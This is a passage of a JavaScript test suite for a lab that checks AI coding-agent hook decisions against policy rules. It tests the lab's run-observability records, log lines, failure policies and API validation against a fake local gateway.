// Rule 27: the lab's half of the run-observability panel (runObs.js, the route, the events the engine writes). The vendored collector has its own tests in the
// shared folder. Real is tested against an in-process fake AI Gateway on loopback only; the shared settings file is pointed at a file that does not exist.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { AGENT_IDS, nativeRequest } from '../src/agents.js';
import { VERTICALS } from '../src/cast.js';
import { SCENARIOS } from '../src/data.js';
import { ctxFor, scenarioCall } from '../src/evaluation.js';
import { mockCertSubject } from '../src/identity.js';
import { mapGatewayAnswer } from '../src/aiguard.js';
import { assertRunObservability, classify, createMasker, layerMatchers } from '../src/runObservability.js';
import { NO_REPLY_NOTE, RULE_IDS, RUN_ID, createRunLog, decisionLine, failurePolicyEvent, hookAnswerEvent, lineValue, personEvent, policyEvent, replyEvent } from '../src/runObs.js';
import { MAX_RUNS, createWorkspaces } from '../src/workspaces.js';
import { maskDeep } from '../src/mask.js';
import { post, withServer } from './helpers.js';

process.env.STANDALONE_ENV = '/nonexistent/none.env'; // the shared settings file is read live (aiguard.js): never the owner's
const cast = VERTICALS.finance;
const W = (id) => ({ 'x-workspace': id });
const WORDS = /refused|denied|rejected|forbidden|failed|invalid|expired|mismatch|token|audience|scope|served|unauthorized|insufficient|not allowed/i;
const LINE = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z coding-agents-lab decision step=[A-Za-z0-9._:/@-]+ layer=[a-z]+ actor=[A-Za-z0-9._:/@-]+ result=(?:passed|stopped|unclear|no-reply) cause=[A-Za-z0-9._:/@-]+ mode=[A-Za-z0-9._:/@-]+ run=[A-Za-z0-9._:/@-]+$/;
const PRODUCTS = [...new Set(layerMatchers.map((m) => m.product))];
const fragments = (...p) => p.join('');
const KEY = fragments('sk_', 'live_', 'a1B2c3D4e5F6g7H8i9J0k1L2');
const BEARER = fragments('fake-', 'bearer-', 'for-test-', '0000');
const rowsOf = (rec) => rec.rows.filter((r) => r.origin !== 'not-logged');
const lineStep = (l) => / step=(\S+)/.exec(l)[1];
const lineRun = (l) => / run=(\S+)$/.exec(l)[1];
const noMatcherReads = (line) => { const at = line.split(' ')[0]; for (const product of PRODUCTS) assert.equal(classify({ product, message: line, at: Date.parse(at), atExact: at }, []), null, `${product}: ${line}`); };

// A recorder whose lines are collected, on a fresh workspace store.
async function obs(fn, { clock, write } = {}) {
  const lines = []; const workspaces = createWorkspaces();
  const runLog = createRunLog({ workspaces, clock, write: write ?? ((l) => lines.push(l)) });
  await withServer((url) => fn(url, { lines, workspaces, runLog }), { runLog, workspaces });
}
const evaluate = async (url, body, ws = 'w-obs-a') => (await post(url, '/api/evaluate', body, W(ws))).json();
const getJson = async (url, p, ws = 'w-obs-a') => { const r = await fetch(`${url}${p}`, { headers: { origin: url, ...W(ws) } }); return { status: r.status, headers: r.headers, body: await r.json() }; };
const recordOf = async (url, runId, mode, ws) => (await getJson(url, `/api/run-observability?mode=${mode}&runId=${runId}`, ws)).body;

// ---- Mock: every scripted action -----------------------------------------------------------------------------------------------------------------
const VERDICT = { deny: 'refused', ask: 'info', alert: 'info', allow: 'allowed' };
const STEP_OF = { person: 'identity', privilege: 'policy-check', agent: 'hook-answer' };

test('every scripted action, for every agent in every vertical, has a Mock record that passes the shared contract, is all simulated, matches its stdout lines and comes through the response mask unchanged', async () => {
  await obs(async (url, { lines }) => {
    let covered = 0; let untouched = 0;
    for (const vertical of Object.keys(VERTICALS)) {
      for (const sc of SCENARIOS) {
        for (const agent of AGENT_IDS) {
          const r = await evaluate(url, { mode: 'mock', agent, scenario: sc.id, vertical });
          if (!r.covered) { untouched += 1; assert.deepEqual(r.obs, { runId: null, began: false, mode: 'mock' }, `${vertical}/${sc.id}/${agent}: no hook event, no run`); continue; }
          covered += 1;
          assert.match(r.obs.runId, RUN_ID);
          const { record } = await recordOf(url, r.obs.runId, 'mock');
          assert.deepEqual(assertRunObservability(record), [], `${vertical}/${sc.id}/${agent}`);
          assert.equal(record.source, 'mock');
          assert.deepEqual(maskDeep(record), record, 'the response mask leaves the record as it is');
          const rows = rowsOf(record);
          assert.ok(rows.every((x) => x.origin === 'simulated' && !x.basis && !x.matchedBy), 'every row is simulated, none presented as read from a log');
          assert.deepEqual(rows.map((x) => x.layer), ['person', 'privilege', 'agent'], 'the order the events happened in');
          assert.equal(rows.find((x) => x.layer === 'privilege').outcome, VERDICT[r.evaluation.decision]);
          assert.ok(rows.filter((x) => x.layer !== 'privilege').every((x) => x.outcome === 'info'), 'the identity and the hook answer are information, never a second verdict');
          assert.deepEqual(record.coverage, { person: 'simulated', agent: 'simulated', authorize: 'not-logged', privilege: 'simulated', gateway: 'not-logged', resource: 'not-logged' });
          // one stdout line per row, written at the time the row carries
          const mine = lines.filter((l) => lineRun(l) === r.obs.runId);
          assert.equal(mine.length, rows.length);
          for (const row of rows) { const l = mine.find((x) => lineStep(x) === STEP_OF[row.layer]); assert.equal(l.split(' ')[0], row.atExact, `${row.layer}: row time = line time`); }
        }
      }
    }
    assert.ok(covered > 100 && untouched > 0, `${covered} covered, ${untouched} without a hook event`);
  });
});

test('how each decision is worded: deny is refused (stopped), ask and alert are information (unclear), a plain allow is allowed (passed), and an agent whose hook cannot enforce is never shown as a plain allow', async () => {
  await obs(async (url, { lines }) => {
    const want = { 'secret-prompt': ['deny', 'refused', 'stopped'], 'shell-chain': ['alert', 'info', 'unclear'], 'sensitive-read': ['ask', 'info', 'unclear'], benign: ['allow', 'allowed', 'passed'] };
    for (const [scenario, [decision, outcome, result]] of Object.entries(want)) {
      const r = await evaluate(url, { mode: 'mock', agent: 'claude-code', scenario });
      assert.equal(r.evaluation.decision, decision);
      const { record } = await recordOf(url, r.obs.runId, 'mock');
      assert.equal(rowsOf(record).find((x) => x.layer === 'privilege').outcome, outcome, scenario);
      const line = lines.find((l) => lineRun(l) === r.obs.runId && lineStep(l) === 'policy-check');
      assert.match(line, new RegExp(` result=${result} `), scenario);
    }
    // Copilot's prompt hook cannot refuse (documented): the rules said deny, the agent's native answer is allow, and the record says exactly that
    const c = await evaluate(url, { mode: 'mock', agent: 'copilot', scenario: 'secret-prompt' });
    assert.equal(c.outcome.native, 'allow');
    const { record } = await recordOf(url, c.obs.runId, 'mock');
    const [, policy, hook] = rowsOf(record);
    assert.equal(policy.outcome, 'refused');
    assert.deepEqual([hook.outcome, hook.detail.unenforceable, hook.detail.native, hook.detail.engine], ['info', true, 'allow', 'deny']);
    assert.match(hook.message, /cannot refuse/);
    assert.equal(record.summary.allowed, 0, 'no plain allow anywhere in a run the rules refused');
    assert.ok(lines.some((l) => lineRun(l) === c.obs.runId && / cause=native-allow-unenforceable /.test(l)));
    // Codex has no working ask: the rules said ask, the hook printed a refusal instead
    const x = await evaluate(url, { mode: 'mock', agent: 'codex', scenario: 'sensitive-read' });
    assert.equal(rowsOf((await recordOf(url, x.obs.runId, 'mock')).record)[2].detail.degraded, true);
  });
});

test('a run that begins no run says so: an agent with no hook event, Enabled off and an agent that is not listed write no line, store no record and return no run id', async () => {
  await obs(async (url, { lines }) => {
    const story = await (await fetch(`${url}/api/story`, { headers: { origin: url } })).json();
    const off = { ...story.defaultConfig, Enabled: false };
    const unlisted = { ...story.defaultConfig, Agents: { cursor: true } };
    const cases = [
      { mode: 'mock', agent: 'antigravity', scenario: 'secret-prompt' }, // Antigravity has no prompt hook
      { mode: 'mock', agent: 'claude-code', scenario: 'benign', config: off },
      { mode: 'live', agent: 'claude-code', scenario: 'benign', config: unlisted },
      { mode: 'real', agent: 'claude-code', scenario: 'benign', config: off },
    ];
    for (const body of cases) {
      const r = await evaluate(url, body);
      assert.equal(r.covered, false);
      assert.deepEqual(r.obs, { runId: null, began: false, mode: body.mode }, JSON.stringify(body).slice(0, 60));
    }
    assert.deepEqual(lines, []);
  });
});

test('events keep the time they were stamped and the order they happened in: with a frozen clock every row and line carries that one time, in event order, with no invented spacing', async () => {
  const at = Date.parse('2026-11-22T10:00:00.000Z');
  await obs(async (url, { lines }) => {
    const r = await evaluate(url, { mode: 'mock', agent: 'cursor', scenario: 'destructive-shell' });
    const { record } = await recordOf(url, r.obs.runId, 'mock');
    assert.deepEqual(rowsOf(record).map((x) => [x.layer, x.at]), [['person', '2026-11-22T10:00:00.000Z'], ['privilege', '2026-11-22T10:00:00.000Z'], ['agent', '2026-11-22T10:00:00.000Z']]);
    assert.deepEqual(rowsOf(record).map((x) => x.id), ['r1', 'r2', 'r3']);
    assert.ok(lines.every((l) => l.startsWith('2026-11-22T10:00:00.000Z ')));
    assert.deepEqual(record.window, { from: '2026-11-22T10:00:00.000Z', to: '2026-11-22T10:00:00.000Z' });
    assert.ok(rowsOf(record).every((x) => !('eventSeq' in x.detail)), 'the ordering key is not shown');
  }, { clock: () => at });
});

// ---- Live: the real hook script into the lab's own gateway ---------------------------------------------------------------------------------------
test('Live: the gateway writes its decision at the moment it makes it and it joins the run waiting for that trace; a hook run by hand is one line with no run, and a bad post is the lab turning it away', async () => {
  await obs(async (url, { lines }) => {
    const r = await evaluate(url, { mode: 'live', agent: 'claude-code', scenario: 'destructive-shell' });
    const mine = lines.filter((l) => lineRun(l) === r.obs.runId);
    assert.deepEqual(mine.map(lineStep), ['identity', 'policy-check', 'hook-answer']);
    assert.ok(mine.every((l) => / mode=live /.test(l)));
    const t = mine.map((l) => Date.parse(l.split(' ')[0]));
    assert.ok(t[0] <= t[1] && t[1] <= t[2] && t[2] - t[0] > 0, 'the hook script is a real process: the decision is stamped after the identity and the answer after the decision');
    const { record } = await recordOf(url, r.obs.runId, 'live');
    assert.deepEqual(assertRunObservability(record), []);
    assert.equal(record.source, 'mock');
    assert.deepEqual(rowsOf(record).map((x) => [x.layer, x.outcome, x.origin, x.atExact]), [['person', 'info', 'simulated', mine[0].split(' ')[0]], ['privilege', 'refused', 'simulated', mine[1].split(' ')[0]], ['agent', 'info', 'simulated', mine[2].split(' ')[0]]]);
    assert.match(record.reasons.gateway, /route of the lab's own process/);
    // by hand: nobody waits for this trace
    const before = lines.length;
    const payload = nativeRequest('claude-code', scenarioCall(cast, 'destructive-shell').call, ctxFor(cast));
    const trace = `00-${'a1'.repeat(16)}-${'b2'.repeat(8)}-01`;
    const h = await post(url, '/api/hook', { agent: 'claude-code', certSubject: mockCertSubject(cast), payload }, { traceparent: trace, ...W('w-obs-a') });
    assert.equal(h.status, 200);
    assert.equal(lines.length, before + 1);
    assert.match(lines.at(-1), / step=policy-check .* result=stopped .* mode=live run=-$/);
    // a post the lab turns away: one line, no run
    const bad = await post(url, '/api/hook', { agent: 'not-an-agent', payload: {} }, W('w-obs-a'));
    assert.equal(bad.status, 400);
    assert.match(lines.at(-1), / step=request-check layer=lab actor=- result=stopped cause=unknown_agent mode=- run=-$/);
    for (const l of lines) { assert.match(l, LINE); noMatcherReads(l); }
  });
});

test('the hook\'s decision joins only the run waiting for that workspace and that trace, once', () => {
  const out = [];
  const log = createRunLog({ workspaces: createWorkspaces(), write: (l) => out.push(l) });
  const ev = policyEvent({ evaluation: { decision: 'deny', reasonCode: 'DENY-SECRET-IN-PROMPT', findings: [] }, agent: 'claude-code', kind: 'prompt', live: true });
  const run = log.open({ ws: 'w-a', mode: 'live' });
  run.expectHook('trace-1');
  log.hookDecision('w-b', 'trace-1', ev); // another workspace
  log.hookDecision('w-a', 'trace-2', ev); // another trace
  assert.ok(out.every((l) => lineRun(l) === '-'));
  log.hookDecision('w-a', 'trace-1', ev);
  assert.notEqual(lineRun(out.at(-1)), '-');
  log.hookDecision('w-a', 'trace-1', ev); // a second post for the same trace
  assert.equal(lineRun(out.at(-1)), '-');
  assert.equal(out.length, 4);
  run.abandon();
  log.hookDecision('w-a', 'trace-1', ev);
  assert.equal(lineRun(out.at(-1)), '-', 'a run that ended is no longer waiting');
});

test('Gateway down: the hook\'s failure policy is the lab\'s own stop when it refuses (blocked) and no decision when it proceeds; Live adds a no-reply line for the call that got nothing, never a row', async () => {
  await obs(async (url, { lines }) => {
    const story = await (await fetch(`${url}/api/story`, { headers: { origin: url } })).json();
    const closed = { ...story.defaultConfig, FailClosed: true };
    const cases = [
      ['mock', story.defaultConfig, 'info', 'fail-open-proceeds'], ['mock', closed, 'blocked', 'fail-closed-stop'],
      ['live', story.defaultConfig, 'info', 'fail-open-proceeds'], ['live', closed, 'blocked', 'fail-closed-stop'],
    ];
    for (const [mode, config, outcome, cause] of cases) {
      const r = await evaluate(url, { mode, agent: 'claude-code', scenario: 'destructive-shell', down: true, config });
      const { record } = await recordOf(url, r.obs.runId, mode);
      assert.deepEqual(assertRunObservability(record), []);
      const rows = rowsOf(record);
      assert.deepEqual(rows.map((x) => [x.layer, x.outcome]), [['person', 'info'], ['agent', outcome]], `${mode} ${cause}`);
      assert.equal(record.coverage.privilege, 'not-logged'); assert.equal(record.coverage.gateway, 'not-logged');
      assert.match(record.reasons.privilege, /no decision about this action|no reply/);
      const mine = lines.filter((l) => lineRun(l) === r.obs.runId);
      assert.ok(mine.some((l) => lineStep(l) === 'failure-policy' && l.includes(` cause=${cause} `)), cause);
      assert.equal(mine.some((l) => / result=no-reply /.test(l)), mode === 'live', 'only Live really called a gateway that did not answer');
      assert.ok(!rows.some((x) => x.layer === 'privilege' || x.layer === 'gateway'), 'a call that got no reply is no row');
    }
    // FailClosed on, but an agent whose hook cannot refuse: the action proceeds, and the row does not say it was stopped
    const c = await evaluate(url, { mode: 'mock', agent: 'copilot', scenario: 'secret-prompt', down: true, config: closed });
    const agent = rowsOf((await recordOf(url, c.obs.runId, 'mock')).record).find((x) => x.layer === 'agent');
    assert.deepEqual([agent.outcome, agent.message.includes('cannot refuse')], ['info', true]);
  });
});

// ---- Real: what the lab received from the AI Gateway ---------------------------------------------------------------------------------------------
const COMPLETED = (state = 'completed', extra = {}) => ({ jsonrpc: '2.0', id: 'x', result: { kind: 'task', id: 't', status: { state }, artifacts: [{ parts: [{ kind: 'text', text: 'Done.' }] }], ...extra } });
const BLOCKED = { jsonrpc: '2.0', id: 'x', error: { code: -32600, message: 'request blocked by security policy' } };
const OTHER_ERROR = { jsonrpc: '2.0', id: 'x', error: { code: -32000, message: 'something else went wrong' } };
const REDACTED = COMPLETED('completed', { history: [{ role: 'user', parts: [{ kind: 'text', text: 'key is [REDACTED:data_exfiltration]' }] }] });

async function withGateway(reply, fn) {
  const seen = { auth: null, bodies: [], sentAt: null };
  const server = http.createServer((req, res) => {
    let data = ''; req.on('data', (c) => { data += c; });
    req.on('end', async () => {
      seen.auth = req.headers.authorization; seen.bodies.push(data);
      if (reply.delayMs) await new Promise((r) => setTimeout(r, reply.delayMs));
      res.writeHead(reply.status ?? 200, { 'content-type': reply.type ?? 'application/json' });
      res.end(typeof reply.body === 'string' ? reply.body : JSON.stringify(reply.body), () => { seen.sentAt = Date.now(); });
    });
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try { await fn(`http://127.0.0.1:${server.address().port}/a2a`, seen); } finally { server.closeAllConnections(); await new Promise((r) => server.close(r)); }
}
const REAL_KEYS = ['CODING_AGENTS_LAB_AIGATEWAY_URL', 'CODING_AGENTS_LAB_AIGATEWAY_BEARER', 'CENTRAL_AGENT_A2A_URL', 'CENTRAL_AGENT_A2A_BEARER'];
const realEnv = () => Object.fromEntries(REAL_KEYS.map((k) => [k, process.env[k]]));
function withRealEnv(url, fn) {
  const saved = realEnv();
  for (const k of REAL_KEYS) delete process.env[k];
  process.env.CODING_AGENTS_LAB_AIGATEWAY_URL = url;
  process.env.CODING_AGENTS_LAB_AIGATEWAY_BEARER = BEARER;
  return Promise.resolve(fn()).finally(() => { for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; } });
}
// One Real evaluation against a fake gateway: the answer, the lines it wrote and, when it kept one, its record.
async function realRun(reply, { scenario = 'secret-prompt', agent = 'claude-code', body = {} } = {}) {
  let out;
  await withGateway(reply, (gw, seen) => withRealEnv(gw, () => obs(async (url, { lines }) => {
    const res = await post(url, '/api/evaluate', { mode: 'real', agent, scenario, ...body }, W('w-obs-a'));
    const answer = await res.json();
    out = { status: res.status, answer, lines: [...lines], seen, gw, record: answer.obs?.runId ? (await recordOf(url, answer.obs.runId, 'real')).record : null, asMock: answer.obs?.runId ? await recordOf(url, answer.obs.runId, 'mock') : null };
  })));
  return out;
}

test('Real: a reply is one `response` row at the time the lab had it, in the lane that decided, with a line of the same time; the other lanes say why they hold nothing', async () => {
  const kinds = [
    ['a JSON-RPC error with the measured policy-block message', { body: BLOCKED }, 'deny', ['privilege', 'refused', 'policy-stop', 'stopped']],
    ['the same message with an HTTP 400 status', { status: 400, body: BLOCKED }, 'deny', ['privilege', 'refused', 'policy-stop', 'stopped']],
    ['a completed task with no marker, after a slow reply', { body: COMPLETED(), delayMs: 150 }, 'allow', ['privilege', 'allowed', 'completed', 'passed']],
    ['a task that is not completed yet', { body: COMPLETED('working') }, 'allow', ['privilege', 'info', 'not-completed', 'unclear']],
    ['a completed task with a redaction marker (the lab\'s reading)', { body: REDACTED }, 'deny', ['privilege', 'info', 'redaction-marker', 'unclear']],
    ['a JSON-RPC error that is not the block message', { body: OTHER_ERROR }, 'allow', ['gateway', 'info', 'error-reply', 'unclear']],
  ];
  for (const [label, reply, decision, [layer, outcome, cause, result]] of kinds) {
    const r = await realRun(reply);
    assert.equal(r.status, 200, label);
    assert.equal(r.answer.evaluation.decision, decision, label);
    const rec = r.record;
    assert.deepEqual(assertRunObservability(rec), [], label);
    assert.equal(rec.source, 'real');
    const rows = rowsOf(rec);
    assert.equal(rows.length, 1, `${label}: one reply, one row`);
    assert.deepEqual([rows[0].layer, rows[0].outcome, rows[0].origin, rows[0].detail.status], [layer, outcome, 'response', reply.status ?? 200], label);
    assert.match(rows[0].message, /the reply the lab received, not a gateway log line/);
    assert.equal(r.lines.length, 1, `${label}: Real writes the reply's line and nothing the lab computed itself`);
    assert.match(r.lines[0], LINE); noMatcherReads(r.lines[0]);
    assert.match(r.lines[0], new RegExp(` layer=${layer} actor=claude-code result=${result} cause=${cause} mode=real run=${r.answer.obs.runId}$`), label);
    assert.equal(r.lines[0].split(' ')[0], rows[0].atExact, 'row time = line time');
    // the time of the reply: not before the gateway sent it, not when the run began, and not after later work
    const rowAt = Date.parse(rows[0].at);
    assert.ok(rowAt >= r.seen.sentAt - 2 && rowAt - r.seen.sentAt < 250, `${label}: the row is stamped when the reply was in hand (${rowAt - r.seen.sentAt} ms after it was sent)`);
    assert.ok(rowAt - Date.parse(rec.window.from) >= (reply.delayMs ?? 0), `${label}: the run began before the reply`);
    assert.deepEqual(Object.entries(rec.coverage).filter(([, v]) => v === 'response').map(([k]) => k), [layer]);
    assert.ok(Object.values(rec.coverage).every((v) => v === 'response' || v === 'not-logged'));
    assert.equal(rec.summary.allowed, outcome === 'allowed' ? 1 : 0);
    assert.match(rec.reasons.person, /simulated even in Real/);
    assert.match(rec.reasons.agent, /does not verify/);
    assert.match(rec.reasons.authorize, /does not call PingOne Authorize/);
    assert.match(rec.reasons.resource, /never runs it/);
    // nothing of the key, the gateway address or the gateway's own words is in the record or the line
    const text = JSON.stringify(rec) + r.lines.join('\n');
    assert.ok(!text.includes(BEARER) && !text.includes(r.gw) && !text.includes(new URL(r.gw).host), label);
    assert.ok(!/something else went wrong|request blocked by security policy|Done\./.test(text), 'the gateway\'s own words are not copied into a row');
    assert.equal(r.seen.auth, `Bearer ${BEARER}`);
    // the record of a Real run is a Real answer only: Mock and Live ask for it and get a plain note, with no record
    assert.equal(r.asMock.record, null);
    assert.match(r.asMock.message, /made in real mode and the page is in mock mode/);
  }
});

test('Real: what the lab cannot map (an HTTP 401 or 403, a fault, an unreadable body, an unknown shape) is a fixed 400 with one run=- line and no record: no run id, no reply line, and never a refusal by the gateway', async () => {
  const cases = [
    ['HTTP 401', { status: 401, body: { message: 'nope' } }],
    ['HTTP 403', { status: 403, body: { message: 'nope' } }],
    ['HTTP 500', { status: 500, body: { message: 'boom' } }],
    ['a body that is not JSON', { body: '<html>not json</html>', type: 'text/html' }],
    ['a shape the lab does not map', { body: { hello: true } }],
  ];
  for (const [label, reply] of cases) {
    const r = await realRun(reply);
    assert.equal(r.status, 400, label);
    assert.equal(r.answer.error, 'real_unmapped');
    assert.ok(!('obs' in r.answer), `${label}: an error answer carries no run id`);
    assert.equal(r.lines.length, 1, `${label}: one line, and no reply line for the unmapped answer`);
    assert.match(r.lines[0], / step=request-check layer=lab actor=- result=stopped cause=real_unmapped mode=- run=-$/, label);
    assert.match(r.lines[0], LINE);
    assert.ok(!/ layer=(gateway|privilege) /.test(r.lines[0]), `${label}: the gateway did not decide`);
  }
});

test('an error answer after a run began keeps that run, so the run id on its stdout lines is one the record route can find; an error before any event is a run=- line', () => {
  const lines = []; const workspaces = createWorkspaces();
  const runLog = createRunLog({ workspaces, write: (l) => lines.push(l) });
  const started = runLog.open({ ws: 'w-obs-a', mode: 'live' });
  started.event({ layer: 'privilege', product: 'lab rules (live engine, not Privilege)', step: 'policy-check', outcome: 'refused', cause: 'destructive-command', who: 'claude-code', message: 'A rule fired.', detail: {} });
  started.abandon('live_failed');
  const id = /run=(\S+)$/.exec(lines.at(-1))[1];
  assert.match(id, RUN_ID);
  assert.ok(workspaces.run('w-obs-a', id), 'the run its stdout line names is kept');
  const before = lines.length;
  runLog.open({ ws: 'w-obs-a', mode: 'live' }).abandon('live_failed');
  assert.equal(lines.length, before + 1);
  assert.match(lines.at(-1), / step=request-check layer=lab actor=- result=stopped cause=live_failed mode=- run=-$/);
});

test('Real: a call that got no reply is a no-reply line, a failure-policy line, no row and no pass; every lane says why, and the lab\'s own failure policy is not a row', async () => {
  const saved = realEnv();
  let out;
  await withRealEnv('http://127.0.0.1:1/a2a', () => obs(async (url, { lines }) => {
    const r = await evaluate(url, { mode: 'real', agent: 'claude-code', scenario: 'secret-prompt' });
    out = { r, lines: [...lines], record: (await recordOf(url, r.obs.runId, 'real')).record };
  }));
  assert.deepEqual(out.r.real, { attempted: true, reached: false });
  assert.deepEqual(assertRunObservability(out.record), []);
  assert.equal(rowsOf(out.record).length, 0);
  assert.ok(Object.values(out.record.coverage).every((v) => v === 'not-logged'));
  assert.equal(out.record.reasons.privilege, NO_REPLY_NOTE);
  assert.equal(out.record.reasons.gateway, NO_REPLY_NOTE);
  assert.deepEqual(out.lines.map(lineStep), ['gateway-call', 'failure-policy']);
  assert.match(out.lines[0], / layer=gateway actor=claude-code result=no-reply cause=no-reply mode=real /);
  for (const l of out.lines) { assert.match(l, LINE); noMatcherReads(l); }
  assert.deepEqual(realEnv(), saved, 'the settings the test set are put back');
});

test('Real with the Gateway down tab makes no call: the failure policy is a line, the record holds no row, and nothing the lab computed is passed off as a reply', async () => {
  const r = await realRun({ body: COMPLETED() }, { body: { down: true } });
  assert.equal(r.seen.bodies.length, 0, 'no call was made');
  assert.equal(rowsOf(r.record).length, 0);
  assert.ok(Object.values(r.record.coverage).every((v) => v === 'not-logged'));
  assert.deepEqual(r.lines.map(lineStep), ['failure-policy']);
  assert.deepEqual(assertRunObservability(r.record), []);
});

test('the mode is stored on the run: a run is answered only in the mode it was made in, an unknown mode is a 400, and Mock never gets Real wording', async () => {
  await obs(async (url) => {
    const m = await evaluate(url, { mode: 'mock', agent: 'claude-code', scenario: 'benign' });
    const l = await evaluate(url, { mode: 'live', agent: 'claude-code', scenario: 'benign' });
    assert.equal((await recordOf(url, m.obs.runId, 'mock')).record.rows.length > 0, true);
    assert.equal((await recordOf(url, l.obs.runId, 'live')).record.rows.length > 0, true);
    for (const [run, made, asked] of [[m, 'mock', 'live'], [m, 'mock', 'real'], [l, 'live', 'mock'], [l, 'live', 'real']]) {
      const a = await recordOf(url, run.obs.runId, asked);
      assert.equal(a.record, null);
      assert.ok(a.message.includes(`made in ${made} mode and the page is in ${asked} mode`));
    }
    const mock = await recordOf(url, m.obs.runId, 'mock');
    assert.ok(!/\breal\b/i.test(JSON.stringify(mock)), 'a Mock record has no Real wording');
    // a run that is not there
    const gone = await recordOf(url, 'ev-000000-1', 'mock');
    assert.equal(gone.record, null); assert.match(gone.message, /no record of that run/);
    // anything but the three modes, and anything but the two parameters, is a 400 with { error, message }
    for (const [q, error] of [[`mode=LIVE&runId=${m.obs.runId}`, 'bad_mode'], [`mode=&runId=${m.obs.runId}`, 'bad_mode'], [`runId=${m.obs.runId}`, 'bad_mode'], [`mode=mock&mode=live&runId=${m.obs.runId}`, 'bad_mode'],
      ['mode=mock', 'bad_run_id'], ['mode=mock&runId=', 'bad_run_id'], ['mode=mock&runId=../x', 'bad_run_id'], [`mode=mock&runId[]=${m.obs.runId}`, 'bad_run_id'], [`mode=mock&runId=${m.obs.runId}&x=1`, 'unknown_field']]) {
      const a = await getJson(url, `/api/run-observability?${q}`);
      assert.equal(a.status, 400, q); assert.equal(a.body.error, error, q); assert.equal(typeof a.body.message, 'string'); assert.ok(!('record' in a.body));
    }
  });
});

test('the route follows the lab\'s edge: GET only (405 with Allow), no-store, a credential-looking workspace is a 400, and a run of another workspace is not found', async () => {
  await obs(async (url) => {
    const m = await evaluate(url, { mode: 'mock', agent: 'claude-code', scenario: 'benign' }, 'w-obs-a');
    for (const method of ['POST', 'PUT', 'DELETE']) {
      const r = await fetch(`${url}/api/run-observability`, { method, headers: { origin: url, 'content-type': 'application/json' }, body: method === 'DELETE' ? undefined : '{}' });
      assert.equal(r.status, 405, method); assert.match(r.headers.get('allow'), /GET/);
    }
    const ok = await getJson(url, `/api/run-observability?mode=mock&runId=${m.obs.runId}`, 'w-obs-a');
    assert.equal(ok.headers.get('cache-control'), 'no-store');
    const bad = await getJson(url, `/api/run-observability?mode=mock&runId=${m.obs.runId}`, ['sk', 'abcdefghijklmnop1234'].join('-'));
    assert.deepEqual([bad.status, bad.body], [400, { error: 'bad_workspace' }]);
    const other = await recordOf(url, m.obs.runId, 'mock', 'w-obs-b');
    assert.equal(other.record, null);
  });
});

test('a request that fails validation begins no run: no run id, no record and one `run=-` line that the lab turned it away', async () => {
  await obs(async (url, { lines }) => {
    const story = await (await fetch(`${url}/api/story`, { headers: { origin: url } })).json();
    const cases = [
      [{ mode: 'nope', agent: 'claude-code', scenario: 'benign' }, 'bad_mode'],
      [{ mode: 'mock', agent: 'claude-code', scenario: 'benign', config: { Enabled: 'yes' } }, 'bad_config'],
      [{ mode: 'mock', scenario: 'benign' }, 'unknown_agent'],
      [{ mode: 'mock', agent: 'not-an-agent', scenario: 'benign' }, 'unknown_agent'],
      [{ mode: 'mock', agent: 'claude-code', scenario: 'nope' }, 'unknown_scenario'],
      [{ mode: 'mock', agent: 'claude-code' }, 'bad_request'],
      [{ mode: 'mock', agent: 'claude-code', custom: { kind: 'prompt', text: 'hello' } }, 'live_required'],
      [{ mode: 'live', agent: 'claude-code', custom: { kind: 'nope', text: 'hello' } }, 'bad_custom'],
      [{ mode: 'real', agent: 'claude-code', scenario: 'benign' }, 'real_not_configured'],
    ];
    for (const [body, code] of cases) {
      const before = lines.length;
      const res = await post(url, '/api/evaluate', { vertical: story.vertical, ...body }, W('w-obs-a'));
      const a = await res.json();
      assert.equal(res.status, 400, code); assert.equal(a.error, code); assert.ok(!('obs' in a), code);
      assert.equal(lines.length, before + 1, `${code}: one line`);
      assert.match(lines.at(-1), new RegExp(` step=request-check layer=lab actor=- result=stopped cause=${code} mode=- run=-$`));
      assert.match(lines.at(-1), LINE);
    }
    const arr = await post(url, '/api/evaluate', [], W('w-obs-a'));
    assert.equal(arr.status, 400); assert.match(lines.at(-1), /cause=bad_request /);
    for (const l of lines) noMatcherReads(l);
  });
});

test('Reset clears this workspace\'s run records with its audit trail; ids never repeat across Reset or workspaces, and the lab says so for a run that is gone', async () => {
  await obs(async (url) => {
    const ids = [];
    for (const ws of ['w-obs-a', 'w-obs-b', 'w-obs-a']) { const r = await evaluate(url, { mode: 'mock', agent: 'claude-code', scenario: 'benign' }, ws); ids.push(r.obs.runId); }
    assert.equal(new Set(ids).size, 3);
    assert.ok((await recordOf(url, ids[0], 'mock', 'w-obs-a')).record);
    assert.equal((await post(url, '/api/reset', {}, W('w-obs-a'))).status, 200);
    const gone = await recordOf(url, ids[0], 'mock', 'w-obs-a');
    assert.equal(gone.record, null); assert.match(gone.message, /Reset cleared it/);
    assert.ok((await recordOf(url, ids[1], 'mock', 'w-obs-b')).record, 'another workspace keeps its run');
    const after = await evaluate(url, { mode: 'mock', agent: 'claude-code', scenario: 'benign' }, 'w-obs-a');
    assert.ok(!ids.includes(after.obs.runId), 'the counter does not start again after a Reset');
  });
});

test('run records are kept per workspace and per mode: newer runs push out only older runs of the same mode, and the open run is never in the list', async () => {
  const workspaces = createWorkspaces();
  const run = (id, mode) => ({ id, mode, events: [], notes: [] });
  for (let i = 1; i <= MAX_RUNS + 2; i += 1) workspaces.addRun('w-a', run(`m${i}`, 'mock'));
  workspaces.addRun('w-a', run('l1', 'live'));
  for (let i = 1; i <= MAX_RUNS + 1; i += 1) workspaces.addRun('w-a', run(`r${i}`, 'real'));
  assert.deepEqual([1, 2].map((i) => workspaces.run('w-a', `m${i}`)), [null, null]);
  assert.ok([3, 4, 5, 6, 7].every((i) => workspaces.run('w-a', `m${i}`)), 'the last five Mock runs');
  assert.ok(workspaces.run('w-a', 'l1'), 'Real and Live runs never push out Mock ones, nor the other way round');
  assert.equal(workspaces.run('w-a', 'r1'), null);
  assert.ok(workspaces.run('w-a', 'r6'));
  assert.equal(workspaces.run('w-b', 'm7'), null);
  // a run is stored when it ends: while it is open it is not in the list, so nothing can push it out
  const log = createRunLog({ workspaces, write: () => {} });
  const open = log.open({ ws: 'w-a', mode: 'mock' });
  open.event(personEvent({ identity: 'maya.chen@fabrikam.example', device: 'LT-4821' }));
